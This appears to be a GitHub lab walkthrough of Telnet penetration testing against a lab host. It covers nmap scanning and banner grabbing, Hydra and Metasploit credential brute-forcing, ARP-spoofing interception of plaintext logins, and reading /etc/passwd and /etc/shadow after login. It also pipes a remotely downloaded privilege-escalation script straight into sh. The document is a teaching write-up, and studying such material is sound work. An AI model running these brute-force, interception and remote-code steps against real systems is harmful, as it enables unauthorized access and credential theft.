<img width="1903" height="280" alt="image" src="https://github.com/user-attachments/assets/00b84af4-1bf6-4bff-90bd-768c55f2d623" /># Telnet


## Scope


## LAB TOOLS



# Telnet Penetration Testing Methodology

## Information Gathering

### Network Scanning & Service Detection

#### Telnet port scan
````
nmap -p 23 192.168.127.129
````
<img width="665" height="242" alt="image" src="https://github.com/user-attachments/assets/2a2035b9-2dcb-4836-8f25-b369e5b67c0b" />


#### Service version detection
````
nmap -p 23 -sV 192.168.127.129
````
<img width="961" height="280" alt="image" src="https://github.com/user-attachments/assets/b58e893f-80d6-4659-b694-b20c8ce07944" />


#### Multiple Telnet ports scan
````
nmap -p 23,992,2389 -sV 192.168.127.129
````
<img width="947" height="317" alt="image" src="https://github.com/user-attachments/assets/fd36f769-a1b4-48ca-bc8a-c356d2a064d8" />


#### scan with scripts
````
nmap -p 23 -A --script telnet* 192.168.127.129
````
<img width="1030" height="655" alt="image" src="https://github.com/user-attachments/assets/f97a4064-96f2-4c29-b19a-48710ff085a2" />


#### UDP Telnet scan
````
nmap -sU -p 23 192.168.127.129
````
<img width="662" height="237" alt="image" src="https://github.com/user-attachments/assets/cb123bdb-407c-492c-9365-704c78fb279b" />


#### Full port scan including Telnet
````
nmap -p- --min-rate 1000 192.168.127.129 | grep 23
````
<img width="605" height="82" alt="image" src="https://github.com/user-attachments/assets/9e76f55b-2d24-46b9-8746-90d829c43b0c" />

- `-p-`: Tells Nmap to scan all 65,535 TCP ports, not just the default top 1000.
- `--min-rate 1000`: Forces Nmap to send at least 1000 packets per second, speeding up the scan. Useful for faster results in labs.
- `| grep 23`: Filters the output to show only lines containing port 23, which is typically Telnet.


#### OS detection and service info
````
nmap -O -sV 192.168.127.129
````
<img width="952" height="798" alt="image" src="https://github.com/user-attachments/assets/c8a5ea6d-a0cf-4653-98a5-482bee27e34a" />

--


### Banner Grabbing & Service Identification
#### Direct telnet connection
````
telnet 192.168.127.129 23
````
<img width="795" height="446" alt="image" src="https://github.com/user-attachments/assets/52ec4466-052c-4a63-ad55-2aad694fe6ae" />

- In this until we know `password`.

#### Netcat for banner grabbing
````
nc -nv 192.168.127.129 23
````
<img width="498" height="139" alt="image" src="https://github.com/user-attachments/assets/5f7e9aca-f003-445d-8669-a268fc77e126" />



####  Nmap script for banners
````
nmap -p 23 --script banner 192.168.127.129v
````
<img width="654" height="264" alt="image" src="https://github.com/user-attachments/assets/7e104a10-3a46-4b41-b30d-fafb6573668e" />


#### Timeout method
````
timeout 3 telnet 192.168.127.129 23
````
<img width="781" height="438" alt="image" src="https://github.com/user-attachments/assets/a4baf3df-1c86-4400-ab3c-5bfb2f010855" />


#### Expect script for automation
````
cat > telnet_banner.exp << 'EOF'
````
````
#!/usr/bin/expect
set timeout 5
spawn telnet 192.168.127.129 23
expect {
    "login:" { send "\r"; exp_continue }
    "Password:" { send "\r"; exp_continue }
    timeout { exit }
}
expect eof
EOF
````
````
chmod +x telnet_banner.exp
./telnet_banner.exp
````
<img width="894" height="809" alt="image" src="https://github.com/user-attachments/assets/439f26b1-260f-482b-bde1-58b4f0b91d5a" />

---


##  Enumeration

### Service Enumeration

#### Nmap Telnet scripts
````
nmap -p 23 --script telnet-ntlm-info 192.168.127.129
````
<img width="664" height="241" alt="image" src="https://github.com/user-attachments/assets/720ef24e-1b8d-4722-9072-eef29f7fb895" />

- `--script telnet-ntlr-info`: Runs the ``telnet-ntlm-info` NSE script, which attempts to grab NTLM info from Telnet services.


#### Telnet encryption check
````
nmap -p 23 --script telnet-encryption 192.168.127.129
````
<img width="661" height="280" alt="image" src="https://github.com/user-attachments/assets/76435287-a326-4143-a658-9e5366c3df38" />


- `--script telnet-encryption`: Executes the `telnet-encryption` NSE script, which checks if Telnet supports encryption.

#### All Telnet-related scripts
````
nmap -p 23 --script "telnet* and safe" 192.168.127.129
````
<img width="661" height="272" alt="image" src="https://github.com/user-attachments/assets/c2629593-7347-4653-bd5d-1c86552113cd" />


#### Brute force detection
````
nmap -p 23 --script telnet-brute --script-args telnet-brute.timeout=8s 192.168.127.129
````


#### Telnet protocol features
````
nmap -p 23 --script telnet-tso-env 192.168.127.129
````
<img width="1022" height="266" alt="image" src="https://github.com/user-attachments/assets/8a9727cb-451e-457c-8a1c-7db232311459" />

--

### Manual Protocol Analysis

#### Capture Telnet negotiation
````
echo "" | nc -v 192.168.127.129 23
````
<img width="603" height="135" alt="image" src="https://github.com/user-attachments/assets/6dbfa3c7-79e8-446e-b857-19f52fd2a6a3" />

#### Verbose telnet connection
````
telnet
toggle options
toggle timing
toggle netdata
open 192.168.127.129 23
````
<img width="627" height="796" alt="image" src="https://github.com/user-attachments/assets/d66c328e-23c3-434b-9986-919fcc7c37d7" />

<img width="621" height="736" alt="image" src="https://github.com/user-attachments/assets/9fd627da-77eb-4c02-92a0-342468904b1e" />


#### Using socat for detailed analysis
````
socat -v TCP:192.168.127.129:23 STDIO
````
<img width="530" height="109" alt="image" src="https://github.com/user-attachments/assets/1a37e9f0-31a3-4aca-a930-022e8937a346" />


#### Wireshark/tcpdump capture
````
sudo tcpdump -i any -A -s 0 port 23 -w telnet_negotiation.pcap
````
<img width="956" height="187" alt="image" src="https://github.com/user-attachments/assets/ba510b5a-4eed-4129-af19-5cfd51c8d5de" />

````
cat telnet_negotiation.pcap
````
<img width="576" height="811" alt="image" src="https://github.com/user-attachments/assets/42c44f3a-6c99-4922-8b26-e734f507df06" />

<img width="766" height="761" alt="image" src="https://github.com/user-attachments/assets/b5baf858-498c-4d3c-9d5d-49c6c6796bbe" />

- So in this we got successful.

---



## Credential Testing & Brute Force

### Automated Brute Force Attacks

#### Hydra brute force
````
hydra -l msfadmin -P /usr/share/wordlists/wordlist.txt telnet://192.168.127.129
````
<img width="1903" height="280" alt="image" src="https://github.com/user-attachments/assets/28abd546-a28d-4dd8-975f-ec9d903a0509" />

- So in this we found the correct `password` with `username` that we have.


**Best Practice**: If we want to brute force, we need to know the arget `username` or `password` first, if we don't have `ùsername` or `password` we spend a lot time like 1 day -> month -> year it depend on username and password.



#### Metasploit telnet module
````
msfconsole -q
search telnet_login
show options
````
<img width="1273" height="724" alt="image" src="https://github.com/user-attachments/assets/edfc3654-e161-4c1f-9105-b0d6ccd47ffb" />

```
set RHOSTS 192.168.127.129
show options
```
<img width="1528" height="615" alt="image" src="https://github.com/user-attachments/assets/905e0782-8797-4178-9166-d02ecc4819d1" />

```
set USER_FILE /usr/share/wordlists/user.txt
set PASS_FILE /usr/share/wordlists/wordlist.txt
show options
```
<img width="1710" height="663" alt="image" src="https://github.com/user-attachments/assets/4b95705d-d29d-4423-bc53-79ca86bfc91a" />

```
set VERBOSE false
```
<img width="1705" height="617" alt="image" src="https://github.com/user-attachments/assets/8b9c8a5b-9acd-48f0-a56d-de284c5648ce" />

```
run
```
<img width="1171" height="153" alt="image" src="https://github.com/user-attachments/assets/a2e4ec31-69f6-4158-a9c5-325e19266c7b" />

- We got successful to get `ùsername` and `password`.


---



## Vulnerability Assessment

### Telnet Vulnerability Scanning

#### vulnerability scan
````
nmap -p 23 --script telnet-encryption 192.168.127.129
````
<img width="641" height="271" alt="image" src="https://github.com/user-attachments/assets/5e9c137f-6fe5-412d-b336-e6b264dc1a5e" />

- Login usernames and passwords sent via Telnet are unencrypted and can be captured by anyone who can sniff traffic between you and the server.


#### Check for known vulnerabilities
````
nmap -p 23 --script vuln 192.168.127.129
````
<img width="656" height="233" alt="image" src="https://github.com/user-attachments/assets/f43a2728-822b-4f6c-be26-0f2f52f8be75" />


#### Specific Telnet security checks
````
nmap -p 23 --script telnet-brute \
  --script-args userdb=/usr/share/wordlists/user.txt,passdb=/usr/share/wordlists/wordlist.txt \
  192.168.127.129
````
<img width="976" height="353" alt="image" src="https://github.com/user-attachments/assets/4d85ebfc-dfc1-449b-9cb7-293bb2673c5a" />

- We found the correct `usernaem` and `password`.


#### Telnet protocol security assessment
````
nmap -p 23 --script telnet-ntlm-info --script-args telnet-ntlm-info.flood 192.168.127.129
````
<img width="984" height="240" alt="image" src="https://github.com/user-attachments/assets/635a9361-6578-4825-a2af-4e2e442645a2" />





### Network Traffic Analysis
#### Capture Telnet traffic
````
sudo tcpdump -i eth0 -s 0 -w telnet_capture.pcap port 23 
````
<img width="907" height="126" alt="image" src="https://github.com/user-attachments/assets/b0253517-719e-487a-a32b-e8720f162f52" />

- In this Press `Enter`, and wait others open telnet and type username and password.
- In `eth0` is interface we can check our interface by `ifconfig`:
<img width="642" height="317" alt="image" src="https://github.com/user-attachments/assets/89a7bbf4-e6d4-4c08-ae5f-bfd9f4fb811b" />


- In others `termnal` we open our `wireshark`:
````
sudo wireshark
````
<img width="1535" height="730" alt="image" src="https://github.com/user-attachments/assets/ac2f6805-cdc9-4513-a564-eb7c1d09d527" />


- When they `username` and `password`:
<img width="815" height="813" alt="image" src="https://github.com/user-attachments/assets/c41e1a44-38bc-41a3-8596-441da0b1bd27" />


- **After back to our wireshark:**
<img width="1910" height="905" alt="image" src="https://github.com/user-attachments/assets/c4647ed4-8afe-484b-bd4e-bf2ad90161c5" />

- We got the correct `username` and `password`.
<img width="1895" height="731" alt="image" src="https://github.com/user-attachments/assets/c0914653-c18b-40d8-b5c7-f299c6a3d81c" />

- Look for this we will get the correct `username` and `password`.


- Also in our `tcpdump` and check `with our file`:
````
cat telnet_capture.pcap
````
<img width="496" height="770" alt="image" src="https://github.com/user-attachments/assets/8b66f9c0-764f-471a-87d8-2ab245c47124" />

<img width="846" height="777" alt="image" src="https://github.com/user-attachments/assets/6f0a16c8-f8a2-4f34-ac88-55f97bc66c37" />

- We got the correct `Username` and `Password`.


- **Analyze captured with traffic:**
````
tshark -r telnet_capture.pcap -Y "telnet"
````
<img width="1692" height="740" alt="image" src="https://github.com/user-attachments/assets/d148d5df-26c9-4da8-909e-f782febff5e2" />


- **Look for credentials in plaintext**
````
strings telnet_capture.pcap | grep -E "(login|password|username|Login|Password)" | head -20
````
<img width="1001" height="472" alt="image" src="https://github.com/user-attachments/assets/33e5a0f1-87ca-4469-84a8-b97c4cb40275" />

- `strings`: is a Linux command that extracts printable ASCII strings from binary files.
- `grep`: filters lines that match a pattern.
- `-E`: enables extended regular expressions, so you can use | (OR) to match multiple words.
- `head -20`: shows only the first 20 matching lines.


- **Detailed protocol analysis**
````
tshark -r telnet_capture.pcap -V | grep -A 5 -B 5 "telnet"
````
<img width="975" height="698" alt="image" src="https://github.com/user-attachments/assets/b85058bd-ceff-4214-82ec-cb46e50fffa9" />


---




## Exploitation

### Session Hijacking & MITM Attacks

#### ARP spoofing for Man-in-the-Middle
````
sudo arpspoof -i eth0 -t 192.168.127.129 192.168.127.1
````
or 
````
sudo arpspoof -i eth0 -t 192.168.127.1 192.168.127.129
````
<img width="948" height="222" alt="image" src="https://github.com/user-attachments/assets/227d976d-3937-4938-b05e-481ad0438dc7" />

- **In wireshark:**
````
sudo wireshark
````
<img width="917" height="249" alt="image" src="https://github.com/user-attachments/assets/d51e09a9-5f0c-48cd-af3f-2db472aff7f1" />


- **In target**
  if they type password and username:
  <img width="679" height="779" alt="image" src="https://github.com/user-attachments/assets/ce0ff993-453d-45fb-be3b-a8242c878047" />


- **In attacker or wireshark**:
````
tcp.port == 23
````
<img width="1902" height="820" alt="image" src="https://github.com/user-attachments/assets/3d24758c-ccf2-4daf-b471-3b6e8bb8766d" />

<img width="1918" height="844" alt="image" src="https://github.com/user-attachments/assets/8a325ecc-6d15-486e-8ad0-2a08bf9f0f27" />

- We will see our `Target` type `username` and `password` or type anything like in this i'm type `ifconfig` alsoo we will see result.

--


#### Ettercap for MITM
````
sudo ettercap -T -M arp:remote /192.168.127.129// /192.168.127.1//
````
<img width="963" height="783" alt="image" src="https://github.com/user-attachments/assets/fa8da31b-992f-4568-8886-be3dfcf2fbbb" />

<img width="1895" height="658" alt="image" src="https://github.com/user-attachments/assets/33adfa40-ccb1-41d7-9725-d232b20e61c8" />

- **In wireshark:**
<img width="1888" height="842" alt="image" src="https://github.com/user-attachments/assets/e4802f9b-6e76-42a4-a5e0-f638728100c4" />

--



### Known Telnet Exploits

#### Search for Telnet exploits
````
searchsploit telnet
searchsploit "Linux telnet"
````
<img width="1890" height="793" alt="image" src="https://github.com/user-attachments/assets/2926c3fd-f029-4212-b637-edd9e09222c9" />

- In this we see a lot `telnet`:
- Or we can search specific `nmae`
<img width="1897" height="319" alt="image" src="https://github.com/user-attachments/assets/b0109fc0-9826-4c65-b86c-234169c31c5a" />


#### search in metasploit
````
msfconsole -q
search tenet
````
<img width="1444" height="789" alt="image" src="https://github.com/user-attachments/assets/e8f752f3-2096-4779-875f-5a58cee782d4" />

- Search specific Telnet exploits
````
search telnet_login
use auxiliary/scanner/telnet/telnet_login
show options
````
<img width="1434" height="775" alt="image" src="https://github.com/user-attachments/assets/5da82256-c6ad-44d3-a385-e3e49076cb55" />


````
set RHOSTS 192.168.127.129
show options
````
<img width="1380" height="590" alt="image" src="https://github.com/user-attachments/assets/608f2fa4-ed4a-4810-81f6-02bfdf76b92b" />


````
set USER_FILE /usr/share/wordlists/user.txt
set PASS_FILE /usr/share/wordlists/wordlist.txt
set STOP_ON_SUCCESS true
show options
````
<img width="1545" height="665" alt="image" src="https://github.com/user-attachments/assets/7ae3d148-9f4a-4ac5-9dc6-6d014132fdca" />


````
run
````


---



## Post-Exploitation

### Initial Access & System Reconnaissance

#### Connect with successful credentials
````
telnet 192.168.127.129
````
<img width="829" height="736" alt="image" src="https://github.com/user-attachments/assets/6da1f19d-74a6-428c-8ab4-a013bea8e32b" />

- In this we already have the correct `username` and `password` 


#### Once logged in, run these commands systematically:

- System Information
````
uname -a
cat /etc/issue
cat /etc/*release
````
<img width="941" height="489" alt="image" src="https://github.com/user-attachments/assets/1f1792a8-902a-4377-a51c-198a00ed49ea" />

````
lsb_release -a 2>/dev/null
cat /proc/version
hostname
````
<img width="1038" height="673" alt="image" src="https://github.com/user-attachments/assets/f695426a-c725-4d0d-8359-98bce1903359" />

````
dmesg | head -20
````
<img width="1046" height="477" alt="image" src="https://github.com/user-attachments/assets/76884bf6-d1f2-4bfd-8281-80de0ef50d8a" />


- User Information
````
whoami
id
last
````
<img width="1036" height="738" alt="image" src="https://github.com/user-attachments/assets/e77416f2-107c-4d91-87af-b688c96103bd" />


````
lastlog
cat /etc/passwd
cat /etc/group
cat /etc/shadow 2>/dev/null
````
<img width="783" height="735" alt="image" src="https://github.com/user-attachments/assets/728cf9f0-bd99-449f-819f-4fc70d486ec3" />

<img width="794" height="735" alt="image" src="https://github.com/user-attachments/assets/5853a821-5d88-4529-95f5-0a2d8071ec77" />

<img width="481" height="714" alt="image" src="https://github.com/user-attachments/assets/9a47a238-1621-4c63-95ee-b5c883b07d14" />



##### We can search any in system:
-  Network Information
````
ifconfig
ip addr show
netstat -tulpn
ss -tulpn
route -n
arp -a
cat /etc/resolv.conf
cat /etc/hosts
````


- Process Information
````
ps aux
ps -ef
top -n 1
pstree
````

- File System Exploration
````
pwd
ls -la
df -h
mount
cat /etc/fstab
find / -type f -name "*.txt" 2>/dev/null | head -20
find / -type f -name "*.conf" 2>/dev/null | head -20
find / -type f -name "*.sh" 2>/dev/null | head -20
````

---




##  Privilege Escalation

### Sudo privileges check
````
sudo -l
cat /etc/sudoers
````
<img width="691" height="733" alt="image" src="https://github.com/user-attachments/assets/6b25a1a2-1b49-40a7-ba1a-280c02f0966c" />

--

### SUID/SGID files
````
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
````


### World-writable files
````
find / -perm -0002 -type f ! -path "/proc/*" 2>/dev/null
````


### Cron jobs
````
crontab -l
ls -la /etc/cron*
cat /etc/crontab
ls -la /var/spool/cron/
````



### Kernel version
````
uname -r
cat /proc/version
````


### Installed packages
````
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null
````


### Environment variables
````
env
set
````

### History files
````
cat ~/.bash_history
cat ~/.sh_history 2>/dev/null
````

--- 





## Automated Privilege Escalation Scripts

### Download and run LinPEAS
````
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
````

### Or download first then execute
````
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
````

### Linux Exploit Suggester
````
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
````

### Linux Smart Enumeration
````
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh
````
----




----
## ====>> Finished OF Telnet
----


---
## Credit:


### Date: 
----
